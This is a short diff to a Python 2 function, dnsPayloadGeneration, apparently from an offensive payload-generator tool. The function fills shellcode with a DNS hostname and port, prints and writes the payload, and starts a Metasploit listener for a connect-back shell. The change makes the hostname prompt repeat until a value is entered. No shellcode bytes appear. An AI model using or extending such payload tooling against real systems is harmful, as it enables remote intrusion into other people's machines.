@@ -102,13 +102,17 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
     except:
         print t.bold_red + '[*] Error in Port Syntax'
         sys.exit(1)
-    DNSaddr = raw_input(
-        '\n[*] Please Enter DNS Hostname Manually\n[*] DNS> ')
+    while True:
+        DNSaddr = raw_input(
+            '\n[*] Please Enter DNS Hostname\n[*] DNS> ')
+        if DNSaddr:
+            break
     shellcode = payloadchoice % (DNSaddr,porthex)
     print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
     ez2read_shellcode, startDnsMetasploit = askAndReturnModules(shellcode,'dns')
+    print ez2read_shellcode
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
-    startHttpsMetasploit(portnum,DNSaddr)
+    startDnsMetasploit(portnum,DNSaddr)
     return "clear"
 
 
